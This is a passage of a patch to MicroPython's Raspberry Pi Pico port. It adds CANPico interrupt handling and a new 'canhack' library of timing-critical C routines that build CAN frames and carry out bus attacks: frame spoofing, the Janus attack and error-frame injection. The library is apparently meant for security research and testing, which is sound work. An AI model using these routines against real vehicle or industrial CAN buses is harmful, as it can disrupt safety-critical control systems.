+                                             (((uint32_t)(buf)[1]) << 16) |  \
+                                             (((uint32_t)(buf)[2]) << 8) |  \
+                                             ((uint32_t)(buf)[3]))
+
+#endif //FIRMWARE_COMMON_H
Index: ports/rp2/machine_pin.c
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/machine_pin.c b/ports/rp2/machine_pin.c
--- a/ports/rp2/machine_pin.c	(revision 321d1897c34f16243edf2c94913d7cf877a013d1)
+++ b/ports/rp2/machine_pin.c	(date 1620461873731)
@@ -4,6 +4,7 @@
  * The MIT License (MIT)
  *
  * Copyright (c) 2016-2021 Damien P. George
+ * (Modifications to the code for the MCP2517/18FD CAN controller (c) 2021 Canis Automotive Labs)
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -67,6 +68,10 @@
     mp_irq_obj_t base;
     uint32_t flags;
     uint32_t trigger;
+
+    // Precompute a pointer to the relevant INTR register and an event mask to determine if it has happened
+    io_rw_32 *intr;
+    uint32_t event_mask;
 } machine_pin_irq_obj_t;
 
 STATIC const mp_irq_methods_t machine_pin_irq_methods;
@@ -104,25 +109,54 @@
     {{&machine_pin_type}, 29},
 };
 
+
+#include <inttypes.h>
+
+#include "canis/rp2_mcp251718fd.h"
+
 // Mask with "1" indicating that the corresponding pin is in simulated open-drain mode.
 uint32_t machine_pin_open_drain_mask;
 
-STATIC void gpio_irq(void) {
-    for (int i = 0; i < 4; ++i) {
-        uint32_t intr = iobank0_hw->intr[i];
-        if (intr) {
-            for (int j = 0; j < 8; ++j) {
-                if (intr & 0xf) {
-                    uint32_t gpio = 8 * i + j;
-                    gpio_acknowledge_irq(gpio, intr & 0xf);
-                    machine_pin_irq_obj_t *irq = MP_STATE_PORT(machine_pin_irq_obj[gpio]);
-                    if (irq != NULL && (intr & irq->trigger)) {
-                        irq->flags = intr & irq->trigger;
-                        mp_irq_handler(&irq->base);
-                    }
-                }
-                intr >>= 4;
-            }
+// This is an unused interrupt on the RP2040 and can be used as a handoff for handling GPIO interrupts
+// in MicroPython after the fast GPIO ISR has run.
+#define IO_IRQ_HANDOFF  (31U)
+
+// Mask to see if the MCP2518 has interrupted
+#define SPI_IRQ_LEVEL_MASK          1U << (4U * (SPI_IRQ_GPIO % 8U))
+
+STATIC  TIME_CRITICAL void gpio_irq(void) {
+    // If the CAN subsystem has been initialized
+    if (MP_STATE_PORT(rp2_can_obj) != NULL && (iobank0_hw->intr[SPI_IRQ_GPIO / 8] & SPI_IRQ_LEVEL_MASK)) {
+        // CANPico board has a level sensitive IRQ
+        //
+        // The core that is interrupted is programmed when the interrupt is enabled, and is set to the core
+        // that made the CAN() constructor call. The event for this interrupt and the core is fixed so there is no
+        // need to do any checking, and instead if the SPI_IRQ_GPIO pin has caused the IRQ then it is handled
+        // by this core.
+        mcp251718fd_irq_handler();
+    }
+
+    // This GPIO vector is shared, and needs to be of high priority to service the MCP2518. But
+    // accessing the rest of the MicroPython code could touch flash and run very slowly. So
+    // either go straight to the MCP2518 drivers or raise a deferred ISR on a vector lower
+    // priority (equal to the other ISRs). Can make an unused IRQ pending and direct that to
+    // the MicroPython GPIO vector handler.
+    //
+    // Hand off everything else to the MicroPython handler at lower priority; this requires that
+    // the IRQ is acknowledged here.
+
+    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    // Scan through the interrupt handlers to see if any of them have occurred
+    for (uint32_t gpio = 0; gpio < MP_ARRAY_SIZE(machine_pin_obj); gpio++) {
+        machine_pin_irq_obj_t *irq = MP_STATE_PORT(machine_pin_irq_obj[gpio]);
+
+        if (irq != NULL && (*irq->intr & irq->event_mask)) {
+            irq->flags = *irq->intr & irq->event_mask;
+            // Acknowledge interrupt (if edge sensitive)
+            *irq->intr = irq->event_mask;
+            // TODO move to being handled in the hand-off ISR
+            mp_irq_handler(&irq->base);
         }
     }
 }
@@ -351,6 +385,12 @@
         irq->flags = 0;
         irq->trigger = args[ARG_trigger].u_int;
 
+        // Precompute interrupt status register to dismiss edge interrupts and detect interrupt events
+        irq->intr = &iobank0_hw->intr[self->id & 0x3U];
+        // Four events per interrupt (rising edge, falling edge, level high, level low)
+        // Eight interrupts per register
+        irq->event_mask = irq->trigger << ((self->id & 0x7U) << 2);
+
         // Enable IRQ if a handler is given.
         if (args[ARG_handler].u_obj != mp_const_none) {
             gpio_set_irq_enabled(self->id, args[ARG_trigger].u_int, true);
Index: ports/rp2/canis/canhack.c
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/canhack.c b/ports/rp2/canis/canhack.c
new file mode 100644
--- /dev/null	(date 1620554596409)
+++ b/ports/rp2/canis/canhack.c	(date 1620554596409)
@@ -0,0 +1,747 @@
+// Copyright 2020 Dr. Ken Tindell (https://kentindell.github.io)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
+// CAN hacking library. Targeted at the Raspberry Pi Pico board but should run on anything fast enough
+// with a pair of I/O pins.
+//
+// The Janus Attack sets the bit pattern as follows:
+//
+// ^_____AAAAABBBBB^__...
+// <--a-><-b->
+// The first phase is to force a sync, the second phase is bit value A, the third phase is bit value B.
+// The wrapper generates two bitstreams. The frame attack can be done provided the devices receiving
+// the shorter frame cannot assert an SOF. This can be done by:
+//
+// 1. Ensuring there is no shorter frame (by mutating the payload until the number of stuff bits is the same)
+// 2. Ensuring that traffic is not due yet from the devices that receive the shorter frame.
+// 3. Ensuring that the devices that would generate traffic are in error passive mode.
+
+#include "canhack.h"
+#include <stdio.h>
+
+struct canhack;
+
+// This is the CAN frame bit pattern that will be transmitted after observing 11 idle bits
+struct canhack {
+    canhack_frame_t can_frame1;                 // CAN frame shared with API
+    canhack_frame_t can_frame2;                 // CAN frame shared with API
+
+    // Status
+    bool sent;                                  // Indicates if frame sent or not
+
+    struct {
+        uint64_t bitstream_mask;
+        uint64_t bitstream_match;
+        uint32_t n_frame_match_bits;
+        uint32_t n_frame_match_bits_cntdn;
+        uint32_t attack_cntdn;
+        uint32_t dominant_bit_cntdn;
+    } attack_parameters;
+};
+
+struct canhack canhack;
+
+// Returns true if should re-enter arbitration due to lost arbitration and/or error.
+// Returns false if sent
+TIME_CRITICAL bool send_bits(ctr_t bit_end, ctr_t sample_point, struct canhack *canhack_p, uint8_t tx_index, canhack_frame_t *frame)
+{
+    ctr_t now;
+    uint32_t rx;
+    uint8_t tx = frame->tx_bitstream[tx_index++];
+    uint8_t cur_tx = tx;
+
+    for (;;) {
+        now = GET_CLOCK();
+        // Bit end is scanned first because it needs to execute as close to the time as possible
+        if (REACHED(now, bit_end)) {
+            SET_CAN_TX(tx);
+            bit_end = ADVANCE(bit_end, BIT_TIME);
+
+            // The next bit is set up after the time because the critical I/O operation has taken place now
+            cur_tx = tx;
+            tx = frame->tx_bitstream[tx_index++];
+
+            if ((tx_index >= frame->tx_bits)) {
+                // Finished
+                SET_CAN_TX_REC();
+                canhack_p->sent = true;
+                return false;
+            }
+        }
+        if (REACHED(now, sample_point)) {
+            rx = GET_CAN_RX();
+            if (rx != cur_tx) {
+                // If arbitration then lost, or an error, then give up and go back to SOF
+                SET_CAN_TX_REC();
+                return true;
+            }
+            sample_point = ADVANCE(sample_point, BIT_TIME);
+        }
+    }
+}
+
+// Sends a sequence of bits, returns true if lost arbitration or an error
+TIME_CRITICAL bool send_janus_bits(uint32_t bit_end, uint32_t sync_end, uint32_t split_end, struct canhack *canhack_p, uint8_t tx_index)
+{
+    ctr_t now;
+    uint8_t rx;
+    uint8_t tx1;
+    uint8_t tx2;
+    uint8_t tx_bits = canhack_p->can_frame1.tx_bits > canhack_p->can_frame2.tx_bits ? canhack_p->can_frame1.tx_bits : canhack_p->can_frame2.tx_bits;
+
+    for (;;) {
+        for (;;) {
+            now = GET_CLOCK();
+            // Bit end is scanned first because it needs to execute as close to the time as possible
+            if (REACHED(now, bit_end)) {
+                // Set a dominant state to force a sync (if previous sample was a 1) in all the CAN controllers
+                SET_CAN_TX_DOM();
+                // The next bit is set up after the time because the critical I/O operation has taken place now
+                tx1 = canhack_p->can_frame1.tx_bitstream[tx_index];
+                bit_end = ADVANCE(bit_end, BIT_TIME);
+                break;
+            }
+        }
+        for (;;) {
+            now = GET_CLOCK();
+            if (REACHED(now, sync_end)) {
+                SET_CAN_TX(tx1);
+                tx2 = canhack_p->can_frame2.tx_bitstream[tx_index];
+                tx_index++;
+                if (tx_index >= tx_bits) {
+                    // Finished
+                    SET_CAN_TX_REC();
+                    canhack_p->sent = true;
+                    return false;
+                }
+                sync_end = ADVANCE(sync_end, BIT_TIME);
+                break;
+            }
+        }
+        for (;;) {
+            now = GET_CLOCK();
+            if (REACHED(now, split_end)) {
+                rx = GET_CAN_RX();
+                SET_CAN_TX(tx2);
+                split_end = ADVANCE(split_end, BIT_TIME);
+                if (rx != tx1) {
+                    SET_CAN_TX_REC();
+                    return false;
+                }
+                break;
+            }
+        }
+    }
+}
+
+TIME_CRITICAL void canhack_send_square_wave(void)
+{
+    RESET_CLOCK(0);
+    ctr_t now = 0;
+    ctr_t bit_end = BIT_TIME;
+    uint8_t tx = 0;
+    uint32_t timeout = 160U;
+
+    for (;;) {
+        now = GET_CLOCK();
+
+        if (REACHED(now, bit_end)) {
+            SET_CAN_TX(tx);
+            bit_end = ADVANCE(now, BIT_TIME);
+            tx ^= 1U; // Toggle bit
+            if (--timeout == 0) {
+                SET_CAN_TX_REC();
+                return;
+            }
+        }
+    }
+}
+
+TIME_CRITICAL void canhack_loopback(void)
+{
+    uint8_t rx = 0U;
+    uint8_t prev_rx;
+
+    for (;;) {
+        // Wait for falling edge
+        prev_rx = rx;
+        rx = gpio_get(CAN_RX_PIN);
+        if (prev_rx && !rx) {
+            break;
+        }
+    }
+
+    // Echo loopback for a number of bit times, starting with a falling edge
+    // This should output on to the debug pin any incoming CAN frame
+    uint i = 160U;
+    ctr_t bit_end = BIT_TIME;
+    RESET_CLOCK(0);
+    while(i > 0) {
+        SET_DEBUG(GET_CAN_RX());
+        ctr_t now = GET_CLOCK();
+        if (REACHED(now, bit_end)) {
+            bit_end = ADVANCE(now, BIT_TIME);
+            i--;
+        }
+    }
+    SET_CAN_TX_REC();
+}
+
+// Sends frame 1, returns true if sent (false if a timeout or too many retries)
+TIME_CRITICAL bool canhack_send_frame(uint32_t timeout, uint32_t retries)
+{
+    uint32_t prev_rx = 0;
+    struct canhack *canhack_p = &canhack;
+    uint32_t bitstream = 0;
+    uint8_t tx_index;
+
+    // Look for 11 recessive bits or 10 recessive bits and a dominant
+    uint8_t rx;
+    RESET_CLOCK(0);
+    ctr_t now;
+    ctr_t sample_point = SAMPLE_POINT_OFFSET;
+
+SOF:
+    for (;;) {
+        rx = GET_CAN_RX();
+        now = GET_CLOCK();
+
+        if (prev_rx && !rx) {
+            RESET_CLOCK(0);
+            sample_point = SAMPLE_POINT_OFFSET;
+        }
+        else if (REACHED(now, sample_point)) {
+            ctr_t bit_end = sample_point + SAMPLE_TO_BIT_END;
+            sample_point = ADVANCE(now, BIT_TIME);
+
+            bitstream = (bitstream << 1U) | rx;
+            if ((bitstream & 0x7feU) == 0x7feU) {
+                // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
+                // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
+                tx_index = rx ^ 1U;
+                if (send_bits(bit_end, sample_point, canhack_p, tx_index, &canhack_p->can_frame1)) {
+                    if (retries--) {
+                        bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
+                        goto SOF;
+                    }
+                    return false;
+                }
+                return canhack_p->sent;
+            }
+        }
+        prev_rx = rx;
+        if (--timeout == 0) {
+            SET_CAN_TX_REC();
+            return false;
+        }
+    }
+}
+
+// This sends a Janus frame, with sync_end being the relative time from the start of a bit when
+// the value for the first bit value is asserted, and first_end is the time relative from the start
+// of a bit when the second bit value is asserted.
+TIME_CRITICAL bool canhack_send_janus_frame(uint32_t timeout, ctr_t sync_time, ctr_t split_time, uint32_t retries)
+{
+    uint32_t prev_rx = 0;
+    struct canhack *canhack_p = &canhack;
+    uint32_t bitstream = 0;
+    uint8_t tx_index;
+
+    // Look for 11 recessive bits or 10 recessive bits and a dominant
+    uint8_t rx;
+        ctr_t now = GET_CLOCK();
+    ctr_t sample_point = now + SAMPLE_POINT_OFFSET;
+
+SOF:
+    for (;;) {
+        rx = GET_CAN_RX();
+        now = GET_CLOCK();
+
+        if (prev_rx && !rx) {
+            RESET_CLOCK(0);
+            sample_point = SAMPLE_POINT_OFFSET;
+        }
+        else if (REACHED(now, sample_point)) {
+            bitstream = (bitstream << 1U) | rx;
+            uint32_t bit_end = sample_point + SAMPLE_TO_BIT_END;
+            sample_point = ADVANCE(sample_point, BIT_TIME);
+            if ((bitstream & 0x7feU) == 0x7feU) {
+                sync_time = ADVANCE(sync_time, bit_end);
+                split_time = ADVANCE(split_time, bit_end);
+                // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
+                // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
+                tx_index = rx ^ 1U;
+                if (send_janus_bits(bit_end, sync_time, split_time, canhack_p, tx_index)) {
+                    if (retries--) {
+                        bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
+                        goto SOF;
+                    }
+                    return false;
+                }
+                else {
+                    return canhack_p->sent;
+                }
+            }
+        }
+        prev_rx = rx;
+        if (--timeout == 0) {
+            SET_CAN_TX_REC();
+            return false;
+        }
+    }
+}
+
+#ifdef NOTDEF
+// Print 64-bit shift value; used for debugging/testing shift registers
+static void print_uint64(uint64_t n)
+{
+    for (uint32_t i = 0; i < 64U; i++) {
+        if (1ULL << (63U - i) & n) {
+            printf("1");
+        }
+        else {
+            printf("0");
+        }
+    }
+    printf("\n");
+}
+#endif
+
+// Wait for a targeted frame and then transmit the spoof frame after winning arbitration next
+TIME_CRITICAL bool canhack_spoof_frame(uint32_t timeout, bool janus, ctr_t sync_time, ctr_t split_time, uint32_t retries)
+{
+    uint32_t prev_rx = 1U;
+    struct canhack *canhack_p = &canhack;
+    uint64_t bitstream = 0;
+    uint64_t bitstream_mask = canhack_p->attack_parameters.bitstream_mask;
+    uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;
+
+    uint8_t rx;
+    RESET_CLOCK(0);
+    ctr_t now;
+    ctr_t sample_point = SAMPLE_POINT_OFFSET;
+
+    for (;;) {
+        rx = GET_CAN_RX();
+        now = GET_CLOCK();
+
+        // This in effect is the bus integration phase of CAN
+        if (prev_rx && !rx) {
+            RESET_CLOCK(0);
+            sample_point = SAMPLE_POINT_OFFSET;
+        }
+        else if (REACHED(now, sample_point)) {
+            sample_point = ADVANCE(sample_point, BIT_TIME);
+            bitstream = (bitstream << 1U) | rx;
+            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
+            if ((bitstream & bitstream_mask) == bitstream_match) {
+                if (janus) {
+                    return canhack_send_janus_frame(timeout, sync_time, split_time, retries);
+                }
+                else {
+                    return canhack_send_frame(timeout, retries);
+                }
+            }
+        }
+        prev_rx = rx;
+        if (--timeout == 0) {
+            SET_CAN_TX_REC();
+            return false;
+        }
+    }
+ }
+
+// Wait for a targeted frame and then transmit the spoof frame over the top of the targeted frame
+// Returns true if the frame was sent OK, false if there was an error or a timeout
+TIME_CRITICAL bool canhack_spoof_frame_error_passive(uint32_t timeout)
+{
+    uint32_t prev_rx = 1U;
+    struct canhack *canhack_p = &canhack;
+    uint64_t bitstream = 0;
+    uint64_t bitstream_mask = canhack_p->attack_parameters.bitstream_mask;
+    uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;
+
+    uint8_t rx;
+    RESET_CLOCK(0);
+    ctr_t now;
+    ctr_t sample_point = SAMPLE_POINT_OFFSET;
+
+    for (;;) {
+        rx = GET_CAN_RX();
+        now = GET_CLOCK();
+
+        if (prev_rx && !rx) {
+            RESET_CLOCK(0);
+            sample_point = SAMPLE_POINT_OFFSET;
+        }
+        else if (REACHED(now, sample_point)) {
+            ctr_t bit_end = sample_point + SAMPLE_TO_BIT_END;
+            sample_point = ADVANCE(sample_point, BIT_TIME);
+            bitstream = (bitstream << 1U) | rx;
+            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
+            if ((bitstream & bitstream_mask) == bitstream_match) {
+                send_bits(bit_end, sample_point, canhack_p, canhack_p->attack_parameters.n_frame_match_bits, &canhack.can_frame1);
+                return canhack_p->sent;
+            }
+        }
+        prev_rx = rx;
+        if (--timeout == 0) {
+            SET_CAN_TX_REC();
+            return false;
+        }
+    }
+}
+
+TIME_CRITICAL bool canhack_error_attack(uint32_t timeout, uint32_t repeat, bool inject_error, uint32_t eof_mask, uint32_t eof_match)
+{
+    uint32_t prev_rx = 1U;
+    struct canhack *canhack_p = &canhack;
+    uint64_t bitstream64 = 0;
+    uint64_t bitstream64_mask = canhack_p->attack_parameters.bitstream_mask;
+    uint64_t bitstream64_match = canhack_p->attack_parameters.bitstream_match;
+
+    uint8_t rx;
+    RESET_CLOCK(0);
+    ctr_t now;
+    ctr_t sample_point = SAMPLE_POINT_OFFSET;
+    ctr_t bit_end;
+
+    for (;;) {
+        now = GET_CLOCK();
+        rx = GET_CAN_RX();
+        if (prev_rx && !rx) {
+            RESET_CLOCK(FALLING_EDGE_RECALIBRATE);
+            sample_point = SAMPLE_POINT_OFFSET;
+        }
+        else if (REACHED(now, sample_point)) {
+            bitstream64 = (bitstream64 << 1U) | rx;
+            bit_end = sample_point + SAMPLE_TO_BIT_END;
+            sample_point = ADVANCE(sample_point, BIT_TIME);
+            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
+            if ((bitstream64 & bitstream64_mask) == bitstream64_match) {
+                break;
+                // Now want to inject an (optional) error frame
+            }
+        }
+        prev_rx = rx;
+        if (--timeout == 0) {
+            return false;
+        }
+    }
+
+    // bit_end is in the future, sample_point is after bit_end
+
+    // Inject an error frame
+    if (inject_error) {
+        for (;;) {
+            now = GET_CLOCK();
+            if (REACHED(now, bit_end)) {
+                SET_CAN_TX_DOM();
+                break;
+            }
+        }
+        bit_end = ADVANCE(bit_end, BIT_TIME * 6U);
+        sample_point = ADVANCE(sample_point, BIT_TIME * 6U);
+        for (;;) {
+            now = GET_CLOCK();
+            if (REACHED(now, bit_end)) {
+                SET_CAN_TX_REC();
+                break;
+            }
+        }
+    }
+
+    // Now wait for error delimiter / IFS point to inject a bit one or more times
+    uint32_t bitstream32 = 0;
+
+    for (uint32_t i = 0; i < repeat; i++) {
+        for (;;) {
+            now = GET_CLOCK();
+            rx = GET_CAN_RX();
+            if (prev_rx && !rx) {
+                RESET_CLOCK(FALLING_EDGE_RECALIBRATE);
+                sample_point = SAMPLE_POINT_OFFSET;
+            }
+            else if (REACHED(now, sample_point)) {
+                bitstream32 = (bitstream32 << 1U) | rx;
+                bit_end = sample_point + SAMPLE_TO_BIT_END;
+                sample_point = ADVANCE(sample_point, BIT_TIME);
+                if ((bitstream32 & eof_mask) == eof_match) {
+                    // Inject six dominant bits to ensure an error frame is handled (in case all other devices are
+                    // error passive and do not signal active error frames)
+                    for (;;) {
+                        now = GET_CLOCK();
+                        if (REACHED(now, bit_end)) {
+                            SET_CAN_TX_DOM();
+                            bit_end = ADVANCE(bit_end, BIT_TIME * 7U);
+                            sample_point = ADVANCE(sample_point, BIT_TIME * 7U);
+                            bitstream32 = bitstream32 << 7U; // Pseudo-sample of own dominant bits
+                            break;
+                        }
+                    }
+                    for (;;) {
+                        now = GET_CLOCK();
+                        if (REACHED(now, bit_end)) {
+                            SET_CAN_TX_REC();
+                            break;
+                        }
+                    }
+                    break;
+                }
+            }
+            prev_rx = rx;
+        }
+    }
+    return true;
+}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//
+// CAN frame creator.
+//
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+static void add_raw_bit(uint8_t bit, bool stuff, canhack_frame_t *frame)
+{
+    // Record the status of the stuff bit for display purposes
+    frame->stuff_bit[frame->tx_bits] = stuff;
+    frame->tx_bitstream[frame->tx_bits++] = bit;
+}
+
+static void do_crc(uint8_t bitval, canhack_frame_t *frame)
+{
+    uint32_t bit_14 = (frame->crc_rg & (1U << 14U)) >> 14U;
+    uint32_t crc_nxt = bitval ^ bit_14;
+    frame->crc_rg <<= 1U;
+    frame->crc_rg &= 0x7fffU;
+    if (crc_nxt) {
+        frame->crc_rg ^= 0x4599U;
+    }
+}
+
+static void add_bit(uint8_t bit, canhack_frame_t *frame)
+{
+    if (frame->crcing) {
+        do_crc(bit, frame);
+    }
+    add_raw_bit(bit, false, frame);
+    if (bit) {
+        frame->recessive_bits++;
+        frame->dominant_bits = 0;
+    } else {
+        frame->dominant_bits++;
+        frame->recessive_bits = 0;
+    }
+    if (frame->stuffing) {
+        if (frame->dominant_bits >= 5U) {
+            add_raw_bit(1U, true, frame);
+            frame->dominant_bits = 0;
+            frame->recessive_bits = 1U;
+        }
+        if (frame->recessive_bits >= 5U) {
+            add_raw_bit(0, true, frame);
+            frame->dominant_bits = 1U;
+            frame->recessive_bits = 0;
+        }
+    }
+}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//
+// API to module
+//
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_t dlc, const uint8_t *data, canhack_frame_t *frame)
+{
+    uint8_t len = rtr ? 0 : (dlc >= 8U ? 8U : dlc); // RTR frames have a DLC of any value but no data field
+
+    frame->tx_bits = 0;
+    frame->crc_rg = 0;
+    frame->stuffing = true;
+    frame->crcing = true;
+    frame->dominant_bits = 0;
+    frame->recessive_bits = 0;
+
+    for (uint32_t i = 0; i < CANHACK_MAX_BITS; i++) {
+        frame->tx_bitstream[i] = 1U;
+    }
+
+    // ID field is:
+    // {SOF, ID A, RTR, IDE = 0, r0} [Standard]
+    // {SOF, ID A, SRR = 1, IDE = 1, ID B, RTR, r1, r0) [Extended]
+
+    // SOF
+    add_bit(0, frame);
+
+    // ID A
+    id_a <<= 21U;
+    for (uint32_t i = 0; i < 11U; i++) {
+        if (id_a & 0x80000000U) {
+            add_bit(1U, frame);
+        }
+        else {
+            add_bit(0, frame);
+        }
+        id_a <<= 1U;
+    }
+
+    // RTR/SRR
+    if (rtr || ide) {
+        add_bit(1U, frame);
+    }
+    else {
+        add_bit(0, frame);
+    }
+
+    // The last bit of the arbitration field is the RTR bit if a basic frame; this might be overwritten if IDE = 1
+    frame->last_arbitration_bit = frame->tx_bits - 1U;
+
+    // IDE
+    if (ide) {
+        add_bit(1U, frame);
+    }
+    else {
+        add_bit(0, frame);
+    }
+
+    if (ide) {
+        // ID B
+        id_b <<= 14U;
+        for (uint32_t i = 0; i < 18U; i++) {
+            if (id_b & 0x80000000U) {
+                add_bit(1U, frame);
+            } else {
+                add_bit(0, frame);
+            }
+            id_b <<= 1U;
+        }
+        // RTR
+        if (rtr) {
+            add_bit(1U, frame);
+        }
+        else {
+            add_bit(0, frame);
+        }
+        // The RTR bit is the last bit in the arbitration field if an extended frame
+        frame->last_arbitration_bit = frame->tx_bits - 1U;
+
+        // r1
+        add_bit(0, frame);
+    }
+    else {
+        // If IDE = 0 then the last arbitration field bit is the RTR
+    }
+    // r0
+    add_bit(0, frame);
+
+    // DLC
+    dlc <<= 28U;
+    for (uint32_t i = 0; i < 4U; i++) {
+        if (dlc & 0x80000000U) {
+            add_bit(1U, frame);
+        } else {
+            add_bit(0, frame);
+        }
+        dlc <<= 1U;
+    }
+    frame->last_dlc_bit = frame->tx_bits - 1U;
+
+    // Data
+    for (uint32_t i = 0; i < len; i ++) {
+        uint8_t byte = data[i];
+        for (uint32_t j = 0; j < 8; j++) {
+            if (byte & 0x80U) {
+                add_bit(1U, frame);
+            }
+            else {
+                add_bit(0, frame);
+            }
+            byte <<= 1U;
+        }
+    }
+    // If the length is 0 then the last data bit is equal to the last DLC bit
+    frame->last_data_bit = frame->tx_bits - 1U;
+
+    // CRC
+    frame->crcing = false;
+    uint32_t crc_rg = frame->crc_rg << 17U;
+    for (uint32_t i = 0; i < 15U; i++) {
+        if (crc_rg & 0x80000000U) {
+            add_bit(1U, frame);
+        } else {
+            add_bit(0, frame);
+        }
+        crc_rg <<= 1U;
+    }
+    frame->last_crc_bit = frame->tx_bits - 1U;
+
+    // Bit stuffing is disabled at the end of the CRC field
+    frame->stuffing = false;
+
+    // CRC delimiter
+    add_bit(1U, frame);
+
+    // ACK; we transmit this as a dominant bit to ensure the state machines lock on to the right
+    // EOF field; it's mostly moot since if there are no CAN controllers then there is not much
+    // hacking to do.
+    add_bit(0, frame);
+
+    // ACK delimiter
+    add_bit(1U, frame);
+
+    // EOF
+    add_bit(1U, frame);
+    add_bit(1U, frame);
+    add_bit(1U, frame);
+    add_bit(1U, frame);
+    add_bit(1U, frame);
+    add_bit(1U, frame);
+    add_bit(1U, frame);
+    frame->last_eof_bit = frame->tx_bits - 1U;
+
+    // IFS
+    add_bit(1U, frame);
+    add_bit(1U, frame);
+    add_bit(1U, frame);
+
+    // Set up the matching masks for this CAN frame
+    frame->tx_arbitration_bits = frame->last_arbitration_bit + 1U;
+
+    frame->frame_set = true;
+}
+
+canhack_frame_t *canhack_get_frame(bool second)
+{
+    return second ? &canhack.can_frame2 : &canhack.can_frame1;
+}
+
+// Sets the CAN hack masks from frame 1 (frame 2 is only used in the Janus attack)
+void canhack_set_attack_masks(void)
+{
+    canhack.attack_parameters.n_frame_match_bits = canhack.can_frame1.last_arbitration_bit + 1U;
+    canhack.attack_parameters.bitstream_mask = (1ULL << (canhack.attack_parameters.n_frame_match_bits + 10U)) - 1ULL;
+    canhack.attack_parameters.bitstream_match = 0x3ffULL;
+    for (uint32_t i = 0; i < canhack.attack_parameters.n_frame_match_bits; i++) {
+        canhack.attack_parameters.bitstream_match <<= 1U; // Shift a 0 in
+        canhack.attack_parameters.bitstream_match |= canhack.can_frame1.tx_bitstream[i]; // OR in the bit (first bit is SOF)
+    }
+}
+
+void canhack_init(void)
+{
+    canhack.can_frame1.frame_set = false;
+    canhack.can_frame2.frame_set = false;
+}
Index: ports/rp2/canis/common.c
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/common.c b/ports/rp2/canis/common.c
new file mode 100644
--- /dev/null	(date 1620461592941)
+++ b/ports/rp2/canis/common.c	(date 1620461592941)
@@ -0,0 +1,64 @@
+// Copyright 2020 Canis Automotive Labs (https://canislabs.com)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
+#include "common.h"
+
+#include <py/runtime.h>
+
+void rp2_buf_get_for_send(mp_obj_t o, mp_buffer_info_t *bufinfo, byte *tmp_data) {
+    if (mp_obj_is_int(o)) {
+        tmp_data[0] = mp_obj_get_int(o);
+        bufinfo->buf = tmp_data;
+        bufinfo->len = 1;
+        bufinfo->typecode = 'B';
+    } else {
+        mp_get_buffer_raise(o, bufinfo, MP_BUFFER_READ);
+    }
+}
+
+// Simple worker function to take a bytes object and copy its contents to a buffer (checking for a max).
+// Returns the number of bytes copied.
+uint32_t copy_mp_bytes(mp_obj_t *mp_bytes, uint8_t *dest, uint32_t max_len)
+{
+    if(!MP_OBJ_IS_STR_OR_BYTES(mp_bytes)) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "Bytes parameter expected"));
+    }
+
+    mp_buffer_info_t bufinfo;
+    uint8_t data[1];
+    rp2_buf_get_for_send(mp_bytes, &bufinfo, data);
+
+    if (bufinfo.len > max_len) {
